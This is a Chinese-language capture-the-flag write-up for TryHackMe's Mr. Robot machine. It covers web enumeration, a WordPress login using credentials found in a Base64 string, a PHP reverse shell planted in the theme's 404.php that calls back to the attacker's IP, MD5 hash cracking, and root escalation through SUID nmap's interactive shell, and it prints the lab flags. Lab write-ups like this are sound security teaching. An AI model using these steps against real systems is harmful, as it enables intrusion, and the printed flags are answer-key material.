@@ -1,0 +1,574 @@
+---
+title: "攻克 Mr. Robot CTF：全流程技术详解"
+description: "一份详尽的技术指南，带你完整解密 TryHackMe 上中等难度的 Mr. Robot 靶机，涵盖 Web 枚举、反弹 Shell 以及 SUID 提权。"
+publishedAt: 2021-05-23
+author: "Luka Piplica"
+tags: ["linux", "cybersecurity", "tryhackme", "ctf", "walkthrough"]
+featured: false
+locale: zh
+image: "../../../assets/blog/mr-robot-ctf/featured.webp"
+imageAlt: "《黑客军团》(Mr. Robot) 美剧海报，深红滤镜下的主角艾略特·奥尔德森特写，配有文字‘GOODBYE, FRIEND. MR. ROBOT’"
+---
+
+TryHackMe 上的 Mr. Robot CTF 是一款经典的、深受同名热门美剧启发的经典中等难度靶机。本篇通关指南（Walkthrough）将完整覆盖整个漏洞利用流程——从最初的网络侦察和 Web 目录暴力破解，到稳定反弹 Shell，再到利用配置不当的 SUID 二进制文件进行 Root 权限提升。
+
+---
+
+## 环境与工具
+
+在开始漏洞利用之前，请先通过 OpenVPN 建立与 TryHackMe 网络的安全连接。本演练将使用 Kali Linux 发行版自带的标准工具集：
+
+* **Nmap：** 网络探测与服务发现。
+* **Gobuster：** 目录与文件暴力破解。
+* **Netcat：** 任意数据注入与反弹 Shell 监听。
+* **Python：** TTY Shell 稳定性修复。
+
+---
+
+## 第一阶段：初始访问与网络侦察
+
+在对目标进行任何主动扫描之前，必须先建立一条通往 TryHackMe 基础设施的安全隧道，随后进行积极的端口扫描以绘制攻击面地图。
+
+### 建立 OpenVPN 连接
+
+1. 从官方的 <a href="https://tryhackme.com/access" target="_blank" rel="noopener noreferrer">TryHackMe 访问页面</a> 下载你的自定义配置文件（`.ovpn`）。
+2. 使用具备 Root 权限的 OpenVPN 命令行工具初始化连接：
+
+    ```shell
+    sudo openvpn <YOUR_FILENAME>.ovpn
+    ```
+
+3. 验证隧道接口（`tun0`）已激活，并已在实验室子网内分配到 IP 地址。
+
+### 网络枚举
+
+首先，我们需要查看有哪些端口是开放的。我们对系统了解得越多越好。在这种情况下，我们使用 Nmap 来扫描网络。
+
+#### Nmap 扫描
+
+我们对目标机器执行强力服务扫描（`-A`），以识别开放的端口、操作系统详情以及正在运行的服务版本：
+
+```shell
+nmap -A <TARGET_IP>
+```
+
+### Nmap 扫描结果
+
+```shell
+kali@kali:-/Desktop$ nmap 10.10.51.194 -A
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 18:35 CEST
+Nmap scan report for 10.10.38.44
+Host is up (0.095s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03    
+
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds
+```
+
+正如我们所见，目标开放了 80 端口，这告诉我们该服务是一个基于 HTTP 协议的网站。我们的下一步是使用目录暴力破解来发现 Web 服务器上隐藏的目录和文件。
+
+---
+
+## 第二阶段：Web 目录发现
+
+为了进行目录枚举，我们需要一个高质量的字典文件和一个快速的暴力破解工具。我们将使用 **SecLists** 作为字典库，并使用 **Gobuster** 来执行枚举阶段。
+
+### 安装 SecLists
+
+如果你的系统中尚未安装它，可以使用 `apt` 安装完整的 SecLists 集合：
+
+```shell
+sudo apt install seclists
+```
+
+运行此命令后，字典文件将会被保存在 `/usr/share/seclists/` 目录下。
+
+### 使用 Gobuster 进行目录枚举
+
+我们将使用 Gobuster 的目录模式（`dir`），将其指向目标 URL，并利用 SecLists 中的 `common.txt` 字典来发现 Web 服务器上的活跃端点（Endpoints）：
+
+```shell
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+#### Gobuster 扫描输出
+
+```shell
+kali@kali:~/Desktop$ gobuster dir -u http://10.10.51.194/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.51.194/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/23 18:27:45 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 213]
+/.htaccess            (Status: 403) [Size: 218]
+/.htpasswd            (Status: 403) [Size: 218]
+/0                    (Status: 301) [Size: 0] [--> http://10.10.51.194/0/]
+/Image                (Status: 301) [Size: 0] [--> http://10.10.51.194/Image/]
+/admin                (Status: 301) [Size: 234] [--> http://10.10.51.194/admin/]
+/atom                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/atom/]
+/audio                (Status: 301) [Size: 234] [--> http://10.10.51.194/audio/]  
+/blog                 (Status: 301) [Size: 233] [--> http://10.10.51.194/blog/]   
+/css                  (Status: 301) [Size: 232] [--> http://10.10.51.194/css/]    
+/dashboard            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-admin/] 
+/favicon.ico          (Status: 200) [Size: 0]                                     
+/feed                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]     
+/images               (Status: 301) [Size: 235] [--> http://10.10.51.194/images/] 
+/image                (Status: 301) [Size: 0] [--> http://10.10.51.194/image/]    
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.51.194/]          
+/index.html           (Status: 200) [Size: 1188]                                  
+/js                   (Status: 301) [Size: 231] [--> http://10.10.51.194/js/]     
+/intro                (Status: 200) [Size: 516314]                                
+/license              (Status: 200) [Size: 309]                                   
+/login                (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php]
+/page1                (Status: 301) [Size: 0] [--> http://10.10.51.194/]            
+/phpmyadmin           (Status: 403) [Size: 94]                                               
+/readme               (Status: 200) [Size: 64]                                               
+/rdf                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/rdf/]            
+/robots               (Status: 200) [Size: 41]                                               
+/robots.txt           (Status: 200) [Size: 41]                                               
+/rss                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
+/rss2                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
+/sitemap              (Status: 200) [Size: 0]                                                
+/sitemap.xml          (Status: 200) [Size: 0]                                                
+/video                (Status: 301) [Size: 234] [--> http://10.10.51.194/video/]             
+/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.51.194/wp-admin/]          
+/wp-content           (Status: 301) [Size: 239] [--> http://10.10.51.194/wp-content/]
+/wp-config            (Status: 200) [Size: 0]                                        
+/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.51.194/wp-includes/]
+/wp-cron              (Status: 200) [Size: 0]                                         
+/wp-links-opml        (Status: 200) [Size: 227]                                       
+/wp-load              (Status: 200) [Size: 0]                                         
+/wp-login             (Status: 200) [Size: 2606]                                      
+/wp-mail              (Status: 500) [Size: 3064]                                      
+/wp-settings          (Status: 500) [Size: 0]                                         
+/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php?action=register]
+/xmlrpc               (Status: 405) [Size:42]                                                      
+===============================================================
+2021/05/23 18:40:33 Finished
+===============================================================
+```
+
+---
+
+## 第三阶段：提取第一个 Key
+
+审查我们的目录枚举结果，几个高价值的端点非常引人注目。多个 `/wp-` 路径的存在证实了目标正在运行 WordPress CMS。此外，`/robots.txt` 和 `/robots` 文件可以直接访问。
+
+当我们通过浏览器访问目标 IP 地址时，会看到一个受美剧启发的自定义交互式落地页：
+
+![目标落地页](../../../assets/blog/mr-robot-ctf/1.webp)
+
+为了找到我们的初始切入点，我们通过访问 `http://<目标_IP>/robots.txt` 来检查 `/robots.txt` 文件。Web 服务器在该目录下暴露了两个特定的文件：
+
+![检查 robots.txt](../../../assets/blog/mr-robot-ctf/2.webp)
+
+输出结果揭示了两个资源：
+* `fsociety.dic` —— 一个自定义的字典文件，稍后很可能对身份验证暴力破解非常有用。
+* `key-1-of-3.txt` —— 我们第一个 Flag 的位置。
+
+### 下载第一个 Key
+
+虽然我们直接在浏览器中就能看到该 Token，但我们也可以使用 `curl` 工具通过终端干净利落地下载或读取它：
+
+```shell
+curl -s http://<TARGET_IP>/key-1-of-3.txt
+```
+
+#### 输出结果
+
+```shell
+kali@kali:~/Desktop$ curl -s http://10.10.51.194/key-1-of-3.txt
+
+073403c8a58a1f80d943455fb30724b9
+```
+**成功获取第一个 Key：** 073403c8a58a1f80d943455fb30724b9
+
+---
+
+## 第四阶段：Web 身份验证与暴力破解
+
+在拿到第一个 Flag 之后，我们将焦点转向获取系统的初始访问权限。Gobuster 的输出结果突出了多个 WordPress 端点，特别是指向了 `/wp-login.php`。
+
+### 分析 WordPress 登录表单
+
+当我们访问 `http://<目标_IP>/wp-login.php` 时，会看到一个标准的 WordPress 身份验证面板：
+
+![WordPress 登录面板](../../../assets/blog/mr-robot-ctf/3.webp)
+
+为了继续进行，我们需要有效的凭据。尝试输入任意登录信息会暴露出该应用程序在错误处理方面的一个有趣行为。如果我们输入一个不存在的用户名，系统会给出明确的错误提示：
+
+> **来自应用程序的提示：** "Invalid username."（无效的用户名。）
+
+这种特定的错误配置允许我们进行用户枚举。一旦我们猜中了一个有效的用户名，错误提示就会变成抱怨密码错误，从而证实该用户确实存在。
+
+### 准备字典文件 (`fsociety.dic`)
+
+在进行暴力破解攻击之前，我们必须获取先前在 `/robots.txt` 中发现的自定义字典文件。我们使用 `curl` 下载它：
+
+```shell
+curl -o fsociety.dic http://<TARGET_IP>/fsociety.dic
+```
+
+下载完字典文件后，我们可以检查它的大小和结构。快速分析表明，`fsociety.dic` 是一个包含超过 850,000 个单词的庞大列表。然而，该列表中包含数千个重复条目，这会不必要地降低我们暴力破解的速度。我们可以通过对文件进行排序并仅提取唯一条目（去重）来优化它：
+
+```shell
+sort -u fsociety.dic > fsociety_unique.dic
+```
+
+这将字典的大小从 850,000 多个单词缩减到大约 11,000 个唯一词条，从而显著加快了我们的暴力破解阶段。
+
+### 进行用户与密码枚举
+
+利用优化后的字典，我们可以使用 **WPScan** 或 **Hydra** 等工具针对 WordPress 登录表单进行探测，以发现有效的用户名和密码。首先，我们来枚举有效的用户：
+
+```shell
+wpscan --url http://<TARGET_IP>/ -U fsociety_unique.dic --enumerate u
+```
+
+该扫描很快就识别出了用户名：`elliot`。
+
+然而，我们并不需要耗费计算资源去用字典盲目暴力破解 `elliot` 账户的密码，因为仔细审查之前 Gobuster 的目录扫描结果会发现一条快得多的路径。
+
+### 发现隐藏的凭据
+
+Gobuster 的目录扫描输出中列出了一个返回 `200 OK` 状态码的 `/license` 端点。当我们使用 `curl` 请求该端点时，会收到一份神秘的许可证声明。至关重要的一点是，向下滚动页面或清理掉空白字符后，会在文档的最底部暴露一个隐藏的 Base64 字符串：
+
+```shell
+curl -s http://<TARGET_IP>/license | tr -d "\n"
+```
+
+#### 输出结果
+
+```shell
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a    password or something? ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+
+末尾的特定字符串 `ZWxsaW90OkVSMjgtMDY1Mgo=` 看起来非常可疑，极其像是经过 Base64 编码的凭据。
+
+### 解码 Base64 字符串
+
+我们可以直接在终端中对该字符串进行解码：
+
+```shell
+echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+```
+
+#### 输出结果
+
+```shell
+elliot:ER28-0652
+```
+
+成功！解码后的输出以 `用户名:密码` 的格式提供了有效的凭据：
+* **用户名：** `elliot`
+* **密码：** `ER28-0652`
+
+> **趣味科普：** 密码 `ER28-0652` 是一个精妙的彩蛋，它对应的是《黑客军团》(Mr. Robot) 美剧中艾略特·奥尔德森（Elliot Alderson）在 Allsafe 网络安全公司的员工工号。
+
+---
+
+## 第五阶段：获取初始访问权限（反弹 Shell）
+
+现在我们拥有了管理员凭据，可以登录 WordPress 后台，并尝试在底层服务器上实现远程代码执行（RCE）。
+
+### 登录 WordPress 管理面板
+
+1. 访问 `http://<目标_IP>/wp-login.php`（或 `/login`）。
+2. 使用我们获取的凭据进行登录：`elliot` / `ER28-0652`。
+3. 成功验证身份后，系统会重定向到 WordPress 管理员仪表盘主页。在仪表盘的左下角，可以看到显示的当前版本为 **4.3.1**。这是一个非常陈旧的版本，已知存在可通过主题编辑器利用的漏洞攻击矢量。
+
+![WordPress 管理员仪表盘](../../../assets/blog/mr-robot-ctf/4.webp)
+
+### 利用主题编辑器实现远程代码执行
+
+由于我们拥有管理员级别的权限，可以利用内置的主题编辑器注入自定义 PHP 脚本来执行系统命令。
+
+1. 在左侧导航面板上，依次点击 **Appearance（外观） > Theme Editor（主题编辑器）**。
+
+![主题编辑器导航](../../../assets/blog/mr-robot-ctf/5.webp)
+
+2. 在当前启用的主题模板（通常是 *Twenty Fifteen*）下，找到 **404 Template** (`404.php`)。
+
+![定位 404.php 模板](../../../assets/blog/mr-robot-ctf/6.webp)
+
+3. 我们将用自定义的 PHP 反弹 Shell 脚本替换默认的 `404.php` 模板。这里可以使用广受信任的 <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">PentestMonkey PHP Reverse Shell</a>。
+4. 下载该脚本并更新配置变量（`$ip` 和 `$port`），将其指向你 Kali Linux 机器的本地 IP 地址（分配给 `tun0` 接口的 IP）以及你自定义的监听端口（例如 `1234`）：
+
+    ```php
+    $ip = '10.10.x.x';  // 替换为你的本地 Kali tun0 IP
+    $port = 1234;       // 你的本地监听端口
+    ```
+
+5. 复制更新后的代码并将其完整粘贴到 WordPress 编辑器中，覆盖 `404.php` 的原始内容。点击 **Update File**（更新文件）以保存更改。
+
+> **重要提示：** 在配置 Payload 之前，请务必在 Kali 中使用 `ip a` 或 `ifconfig` 命令，从 `tun0` 接口获取你准确的本地 IP。
+
+### 设置 Netcat 监听器
+
+在触发我们的 Payload 之前，我们必须在 Kali 机器上设置一个本地端口监听器，以捕获传入的连接：
+
+```shell
+nc -nlvp 1234
+```
+
+### 触发反弹 Shell
+
+为了执行我们注入的 PHP 代码，我们需要通过访问一个不存在的页面或直接调用修改后的模板 URL 来触发一个 404 页面：
+
+```shell
+curl -s http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php
+```
+
+或者，只需在浏览器中访问 `http://<目标_IP>/doesnotexist` 即可触发该模板。回到我们的终端，可以发现 Netcat 监听器已成功捕获到连接，为我们提供了一个 Shell：
+
+![捕获到 Netcat 反弹 shell](../../../assets/blog/mr-robot-ctf/7.webp)
+
+---
+
+## 第六阶段：本地枚举与用户权限提升
+
+我们的反弹 Shell 成功建立了连接，但它的权限非常受限。检查当前的权限会发现，我们目前正以一个低权限的服务账户身份运行：
+
+```shell
+$ whoami
+daemon
+```
+
+### 稳定 Shell（生成 TTY Shell）
+
+通过 Netcat 捕获的标准反弹 Shell 通常只是简单的“哑”（Dumb）Shell，缺乏命令历史、Tab 键补全或作业控制等基本功能，并且运行 `su` 或 `sudo` 等命令也会失败。我们需要检查主机上是否安装了 Python，以此来生成一个完全交互式的 TTY Shell：
+
+```shell
+$ which python
+/usr/bin/python
+```
+
+既然 Python 可用，我们就可以使用 `pty` 模块来生成一个交互式的 Bash 会话：
+
+```shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+这将我们的会话升级为一个完全交互式的 TTY Shell，使我们能够执行更复杂的系统命令。
+
+### 调查主（Home）目录
+
+我们列出 `/home` 目录的内容，以寻找合法的系统用户：
+
+```shell
+ls -la /home
+# 输出结果显示了一个名为 'robot' 的用户
+```
+
+检查 `/home/robot` 目录会发现两个关键文件：
+
+```shell
+$ ls -l /home/robot
+total 8
+-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+```
+
+我们可以看到 `key-2-of-3.txt` 包含了我们的第二个 Flag，但它具有严格的只读权限（`-r--------`），并且完全属于 `robot` 用户。然而，第二个文件 `password.raw-md5` 是所有人可读的（World-readable）：
+
+```shell
+$ cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+这为我们提供了用户 `robot` 的 MD5 密码哈希值。
+
+### 破解 MD5 密码哈希
+
+该哈希值 `c3fcd3d76192e4007dfb496cca67e13b` 是一个未加盐（Unsalted）的 MD5 密码表示。由于 MD5 在密码学上非常脆弱，我们可以轻松地反查或破解这个哈希。我们可以使用在线 MD5 数据库查询工具（如 Gromweb 或 CrackStation），也可以在本地使用 **Hashcat** 或 **John the Ripper** 进行破解：
+
+```shell
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+该哈希成功解密为以下明文值：
+`abcdefghijklmnopqrstuvwxyz`
+
+* **用户名：** `robot`
+* **密码：** `abcdefghijklmnopqrstuvwxyz`
+
+### 切换到 Robot 用户
+
+现在，我们可以通过使用刚破解的凭据进行身份验证，从而在本地将权限从低权限的 `daemon` 用户提升至 `robot` 用户：
+
+```shell
+$ su - robot
+Password: abcdefghijklmnopqrstuvwxyz
+robot@mercury:~$ whoami
+robot
+```
+
+### 获取第二个 Key
+
+拥有了新的用户权限后，我们现在可以读取第二个 Flag 了：
+
+```shell
+robot@mercury:~$ cat /home/robot/key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+**第二个 Key 已成功获取：** `822c73956184f694993bede3eb39f959`
+
+---
+
+## 第七阶段：Root 权限提升
+
+在成功获取三个 Key 中的前两个之后，我们的最终目标是提升权限至 `root`，并获取通常存储在 `/root` 目录中的第三个 Key。
+
+### 检查 Sudo 权限
+
+首先，我们检查 `robot` 用户是否通过 sudo 拥有任何管理员权限：
+
+```shell
+robot@mercury:~$ sudo -l
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+Sorry, user robot may not run sudo on linux.
+```
+
+该用户不在 sudoers 组中。因此，我们必须寻找其他的权限提升途径。
+
+### 识别 SUID 二进制文件
+
+Linux 本地权限提升的一个常见途径是利用配置错误的 SUID（设置所有者用户 ID）二进制文件。当运行一个带有 SUID 位的二进制文件时，它会以文件所有者（在这种情况下为 `root`）的权限执行，而不是以当前运行该文件的用户权限执行。
+
+我们在整个文件系统中搜索属于 `root` 的 SUID 二进制文件：
+
+```shell
+find / -user root -perm -4000 -print 2>/dev/null
+```
+
+#### 输出结果
+
+```shell
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+该列表显示了一个非常不寻常的条目：`/usr/local/bin/nmap`。
+
+### 利用 SUID Nmap（交互模式）
+
+我们验证 Nmap 二进制文件的权限和版本：
+
+```shell
+$ ls -l /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+```
+
+所有者权限组合中的 `s`（`-rwsr-xr-x`）确认了该文件已设置 SUID 位，并且它属于 `root`。接下来，我们检查 Nmap 的版本：
+
+```shell
+$ /usr/local/bin/nmap --version
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+```
+
+Nmap 正在运行的版本是 **3.81**。旧版本的 Nmap（特别是 `2.02` 到 `5.21` 之间的版本）包含一个**交互模式**（Interactive mode），旨在允许用户在交互式环境中运行命令和执行脚本。由于 SUID 配置使该二进制文件以 root 级别权限运行，因此从其交互式控制台启动 Shell 会将我们的会话直接提升至 `root`。
+
+1. 以交互模式启动 Nmap：
+    ```shell
+    /usr/local/bin/nmap --interactive
+    ```
+
+2. 在交互式提示符中，我们使用叹号 `!` 前缀来生成一个脱离（Escaping）出来的 Shell：
+    ```shell
+    nmap> !sh
+    ```
+
+3. 验证我们的新权限：
+    ```shell
+    # whoami
+    root
+    ```
+
+我们已成功绕过所有系统限制，现在正以完整的管理员 root 权限运行。
+
+### 获取第三个 Key
+
+我们进入 `/root` 目录并检查最后一个 Flag：
+
+```shell
+# ls -la /root
+total 28
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Nov 13  2015 ..
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+```
+
+我们读取最后一个文本文件的内容：
+
+```shell
+# cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+**第三个 Key 已成功获取：** `04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+## 总结与安全建议
+
+TryHackMe 的 Mr. Robot CTF 是一个展示多阶段系统漏洞利用的典型案例。它说明了简单、微小的漏洞和配置错误（如暴露的 Base64 字符串、糟糕的密码哈希、过时的软件以及 SUID 权限）是如何串联起来，最终导致整台服务器被完全控制的。
+
+### 修复指南
+
+1. **清理 Web 根目录与权限：** 敏感文件（如 `.dic` 字典文件或自定义文本文件）绝对不应该从面向公众的 Web 根目录访问。`/robots.txt` 的配置不应泄露活跃的系统资产或凭据。
+2. **停用过时的 CMS 版本：** 像 WordPress 4.3.1 这样过时的软件版本极易受到攻击。请将所有 Web 应用程序、插件和核心 CMS 系统升级到最新的稳定补丁版本。
+3. **审计 SUID 配置：** 定期扫描系统中的 SUID/SGID 二进制文件。切勿为 Nmap、编译器或文本编辑器等功能强大的执行工具配置 SUID 权限。如果某些特定任务需要 root 执行权限，请通过 `/etc/sudoers` 中精心设计的规则来严格控制权限。
+4. **实施强大的密码策略：** 避免使用明文凭据或标准的 MD5 哈希方案。应使用强大、加盐且现代的哈希算法（例如 bcrypt、Argon2）来保护所有凭据。
+
+---
+
+## 复盘 Flag 台账
+
+以下是在整个渗透过程中获取的最终 Key 列表：
+
+| 问题 / Key 位置 | 获取的哈希值 |
+| :--- | :--- |
+| **Key #1**（来自 `/robots.txt` / Web 服务器根目录） | `073403c8a58a1f80d943455fb30724b9` |
+| **Key #2**（来自 `/home/robot/key-2-of-3.txt`） | `822c73956184f694993bede3eb39f959` |
+| **Key #3**（来自 `/root/key-3-of-3.txt`） | `04787ddef27c3dee1ee161b21670b4e4` |
+
+*本演练指南仅用于教育目的，旨在展示安全系统配置、强大的访问控制以及主动补丁管理的重要性。*
